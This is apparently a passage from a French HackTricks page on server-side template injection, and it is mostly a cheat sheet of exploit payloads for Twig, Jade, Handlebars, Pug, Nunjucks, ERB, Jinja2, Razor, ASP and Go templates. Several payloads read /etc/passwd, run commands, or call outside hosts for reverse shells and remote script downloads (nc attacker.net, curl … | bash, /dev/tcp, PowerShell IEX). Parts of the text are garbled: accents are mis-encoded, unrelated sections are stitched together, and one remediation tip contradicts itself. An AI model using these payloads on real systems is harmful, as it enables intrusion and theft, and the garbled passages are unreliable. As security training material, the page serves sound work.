{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - Format de mod√®le**

Twig est un moteur de template flexible et rapide √©crit en PHP. Il est largement utilis√© dans les applications Symfony et est √©galement disponible en tant que composant autonome. Twig utilise une syntaxe simple et facile √† comprendre pour les mod√®les, ce qui le rend facile √† utiliser pour les d√©veloppeurs de tous niveaux. Les mod√®les Twig sont g√©n√©ralement stock√©s dans des fichiers avec l'extension `.twig`. Les variables sont repr√©sent√©es par des doubles accolades (`{{}}`) et les instructions sont repr√©sent√©es par des accolades et un pourcentage (`{% %}`). Les commentaires sont repr√©sent√©s par des accolades et un di√®se (`{# #}`). Twig prend √©galement en charge l'h√©ritage de mod√®les, ce qui permet aux d√©veloppeurs de cr√©er des mod√®les de base qui peuvent √™tre √©tendus par d'autres mod√®les.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Plus d'informations**

* Dans la section Twig et Twig (Sandboxed) de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates est inspir√© de Twig mais est un moteur de template PHP natif au lieu d'un moteur de template compil√©.

contr√¥leur:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
# Injection de mod√®le c√¥t√© serveur (SSTI)

L'injection de mod√®le c√¥t√© serveur (SSTI) est une vuln√©rabilit√© qui permet √† un attaquant d'injecter du code dans un mod√®le c√¥t√© serveur. Cette vuln√©rabilit√© est souvent trouv√©e dans les applications Web qui utilisent des moteurs de mod√®le tels que **Jinja2**, **Twig**, **FreeMarker**, etc.

## Comment cela fonctionne-t-il?

Lorsqu'une application Web utilise un moteur de mod√®le, elle utilise souvent des variables pour remplir les mod√®les avec des donn√©es dynamiques. Cependant, si ces variables ne sont pas correctement valid√©es, un attaquant peut injecter du code malveillant dans le mod√®le.

Par exemple, consid√©rons le code suivant en utilisant le moteur de mod√®le **Jinja2**:

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name')
    template = '''
    <html>
        <head>
            <title> Hello {{ name }} </title>
        </head>
        <body>
            <h1> Hello {{ name }} </h1>
        </body>
    </html>
    '''
    return render_template_string(template, name=name)
```

Dans cet exemple, l'application Web utilise le moteur de mod√®le **Jinja2** pour remplir le mod√®le avec la variable `name`. Cependant, si un attaquant fournit une entr√©e malveillante pour la variable `name`, il peut injecter du code malveillant dans le mod√®le.

Par exemple, si un attaquant fournit la cha√Æne de caract√®res suivante pour la variable `name`:

```
{{ 7 * 7 }}
```

Le mod√®le sera rendu comme suit:

```html
<html>
    <head>
        <title> Hello {{ 7 * 7 }} </title>
    </head>
    <body>
        <h1> Hello {{ 7 * 7 }} </h1>
    </body>
</html>
```

Le code malveillant `{{ 7 * 7 }}` sera √©valu√© et le r√©sultat `49` sera affich√© dans le mod√®le.

## Comment exploiter une SSTI?

Pour exploiter une SSTI, un attaquant doit trouver une entr√©e qui est utilis√©e pour remplir un mod√®le c√¥t√© serveur sans √™tre correctement valid√©e. Les entr√©es courantes qui peuvent √™tre utilis√©es pour exploiter une SSTI sont:

- Les param√®tres de requ√™te GET et POST
- Les cookies
- Les en-t√™tes HTTP
- Les param√®tres de session

Une fois qu'un attaquant a trouv√© une entr√©e vuln√©rable, il peut injecter du code malveillant dans le mod√®le en utilisant la syntaxe sp√©cifique au moteur de mod√®le. Par exemple, pour **Jinja2**, l'attaquant peut utiliser la syntaxe `{{ code }}` pour injecter du code malveillant.

## Comment pr√©venir une SSTI?

Pour pr√©venir une SSTI, il est important de valider correctement toutes les entr√©es qui sont utilis√©es pour remplir un mod√®le c√¥t√© serveur. Les bonnes pratiques pour pr√©venir une SSTI sont:

- Utiliser des biblioth√®ques de mod√®le qui ont des m√©canismes de s√©curit√© int√©gr√©s, tels que **Django** ou **Flask**.
- √âviter d'utiliser des entr√©es utilisateur pour remplir des mod√®les c√¥t√© serveur.
- Si vous devez utiliser des entr√©es utilisateur pour remplir des mod√®les c√¥t√© serveur, assurez-vous de valider correctement ces entr√©es en utilisant des biblioth√®ques de validation telles que **WTForms**.
- √âviter d'utiliser des moteurs de mod√®le qui permettent l'ex√©cution de code, tels que **Jinja2** ou **Twig**.
- Si vous devez utiliser des moteurs de mod√®le qui permettent l'ex√©cution de code, assurez-vous de limiter les fonctionnalit√©s de ces moteurs en utilisant des options de configuration telles que `autoescape` ou `sandbox`.
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
mod√®le de mise en page :
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlib et HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) est identique √† PHPlib mais port√© sur Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# `authors.php`

## Description

La page `authors.php` affiche une liste d'auteurs de livres. Elle utilise le moteur de template Twig pour g√©n√©rer la page.

## Vulnerability

La page `authors.php` est vuln√©rable √† une injection de template c√¥t√© serveur (SSTI). L'entr√©e utilisateur n'est pas correctement valid√©e avant d'√™tre pass√©e au moteur de template Twig. Cela permet √† un attaquant d'ex√©cuter du code arbitraire sur le serveur.

## Proof of Concept

Pour exploiter cette vuln√©rabilit√©, l'attaquant peut ajouter du code Twig malveillant dans le param√®tre `author` de l'URL. Par exemple :

```
http://example.com/authors.php?author={{7*7}}
```

Cela ex√©cutera le code `7*7` et affichera le r√©sultat `49` sur la page.

## Remediation

Pour corriger cette vuln√©rabilit√©, il est recommand√© de valider et de filtrer toutes les entr√©es utilisateur avant de les passer au moteur de template. Twig fournit des fonctions de filtrage pour √©viter les injections de template. Par exemple, la fonction `escape` peut √™tre utilis√©e pour √©chapper les caract√®res sp√©ciaux dans les cha√Ænes de caract√®res.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade est un moteur de template pour Node.js et est maintenant connu sous le nom de Pug. Il est utilis√© pour g√©n√©rer des pages HTML dynamiques en utilisant des donn√©es fournies par l'application. Les injections de mod√®les c√¥t√© serveur peuvent √™tre effectu√©es en utilisant des variables non √©chapp√©es dans les fichiers de mod√®le Jade. Les variables non √©chapp√©es sont d√©finies en utilisant le signe "=" suivi de la variable. Par exemple, `= user.name` affichera le nom de l'utilisateur sans √©chapper les caract√®res sp√©ciaux. Les attaquants peuvent exploiter cette vuln√©rabilit√© en injectant du code malveillant dans les variables non √©chapp√©es, ce qui peut entra√Æner une ex√©cution de code √† distance ou une divulgation d'informations sensibles.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Plus d'informations**

* Dans la section Jade de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) est un moteur de template PHP non-compilant, qui utilise des balises XML pour diviser un document en diff√©rentes parties.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

Traversal de chemin d'acc√®s (plus d'informations [ici](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Erreur
* ${7\*7} = ${7\*7}
* Rien
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
**Plus d'informations**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Mod√®le** | **Description**                         |
| ------------ | --------------------------------------- |
|              | √âvaluer et rendre la sortie              |
|              | √âvaluer et rendre la sortie encod√©e en HTML |
|              | Commentaire                                 |
| et          | Autoriser le code (d√©sactiv√© par d√©faut)        |

* \= 49

**C√¥t√© client**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**C√¥t√© serveur**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Plus d'informations**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Exemple de rendu c√¥t√© serveur**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Plus d'informations**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Aucune sortie
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Erreur
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Plus d'informations**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Erreur`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Plus d'informations**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Plus d'informations**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Consultez la page suivante pour apprendre des astuces sur la **bypass d'ex√©cution de commandes arbitraires en contournant les sandbox** en python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Erreur`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Plus d'informations**

### Jinja2 (Python)

[Site officiel](http://jinja.pocoo.org)

> Jinja2 est un moteur de template complet pour Python. Il prend en charge l'unicode complet, un environnement d'ex√©cution sandbox√© int√©gr√© en option, largement utilis√© et sous licence BSD.

* `{{7*7}} = Erreur`
* `${7*7} = ${7*7}`
* `{{foobar}} Rien`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Format de mod√®le**

Jinja2 est un moteur de mod√®le pour Python. Il est utilis√© pour g√©n√©rer des documents HTML, XML ou tout autre format de texte. Les mod√®les Jinja2 sont des fichiers texte qui contiennent des balises et des variables. Les balises sont utilis√©es pour contr√¥ler la logique du mod√®le, tandis que les variables sont utilis√©es pour afficher des donn√©es dynamiques.

Les balises Jinja2 sont entour√©es de crochets `{% %}`. Les variables Jinja2 sont entour√©es de doubles crochets `{{ }}`. Les commentaires Jinja2 sont entour√©s de crochets `{# #}`.

Voici un exemple de mod√®le Jinja2 simple :

```
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ heading }}</h1>
    {% for item in items %}
        <p>{{ item }}</p>
    {% endfor %}
</body>
</html>
```

Dans cet exemple, le mod√®le contient une variable `title`, une variable `heading` et une boucle `for` qui affiche chaque √©l√©ment de la liste `items`.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE non d√©pendant de**](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Plus de d√©tails sur comment abuser de Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= Succ√®s`
* `@() <= Succ√®s`
* `@("{{code}}") <= Succ√®s`
* `@ <= Succ√®s`
* `@{} <= ERREUR!`
* `@{ <= ERREUR!`
* `@(1+2)`
* `@( //CodeC# )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBXAGUAYgBzAGsAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

La m√©thode `System.Diagnostics.Process.Start` de .NET peut √™tre utilis√©e pour d√©marrer n'importe quel processus sur le serveur et ainsi cr√©er un shell web. Vous pouvez trouver un exemple d'application web vuln√©rable sur [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Plus d'informations**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Rien
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Plus d'informations**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

M√™me s'il s'agit de Perl, il utilise des balises comme ERB en Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Erreur`
```
<%= perl code %>
<% perl code %>
```
### SSTI en GO

Pour confirmer que le moteur de template utilis√© dans le backend est Go, vous pouvez utiliser ces charges utiles :

* `{{ . }}` = structure de donn√©es transmise en entr√©e au template
* Si les donn√©es transmises sont un objet qui contient l'attribut Password par exemple, la charge utile pr√©c√©dente le divulguerait, mais vous pourriez √©galement faire : `{{ .Password }}`
* `{{printf "%s" "ssti" }}` = devrait afficher la cha√Æne ssti dans la r√©ponse
* `{{html "ssti"}}`, `{{js "ssti"}}` = Ce sont quelques autres charges utiles qui devraient afficher la cha√Æne "ssti" sans les mots de fin "js" ou "html". Vous pouvez vous r√©f√©rer √† plus de mots-cl√©s dans le moteur [ici](https://golang.org/pkg/text/template).

**Exploitation de XSS**

Si le serveur utilise le package **text/template**, il est tr√®s facile de r√©aliser une XSS en fournissant simplement votre charge utile en entr√©e. Cependant, ce n'est pas le cas avec **html/template** car il encode la r√©ponse en HTML : `{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

Cependant, Go permet de **D√âFINIR** un **template** complet et de l'appeler **plus tard**. La charge utile sera quelque chose comme :\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**Exploitation de RCE**

La documentation pour les modules html/template et text/template peut √™tre trouv√©e [ici](https://golang.org/pkg/html/template/) et [ici](https://golang.org/pkg/text/template/), et oui, ils varient beaucoup. Par exemple, dans **text/template**, vous pouvez **appeler directement n'importe quelle fonction publique avec la valeur "call"**, ce qui n'est pas le cas avec html/template.

Si vous voulez trouver une RCE en go via SSTI, vous devez savoir que comme vous pouvez acc√©der √† l'objet donn√© au template avec `{{ . }}`, vous pouvez √©galement **appeler les m√©thodes des objets**. Ainsi, imaginez que l'**objet transmis a une m√©thode appel√©e System** qui ex√©cute la commande donn√©e, vous pourriez l'abuser avec : `{{ .System "ls" }}`\
Par cons√©quent, vous aurez probablement **besoin du code source**. Un code source potentiel pour quelque chose comme √ßa ressemblera √† :
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Plus d'informations**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Plus d'exploits

Consultez le reste de [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) pour plus d'exploits. Vous pouvez √©galement trouver des informations int√©ressantes sur les balises dans [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Aide connexe

Si vous pensez que cela pourrait √™tre utile, lisez:

* [Astuces Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Fonctions magiques Python](broken-reference/)

## Outils

{% embed url="https://github.com/epinna/tplmap" %}

## Liste de d√©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pratique et r√©f√©rences

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
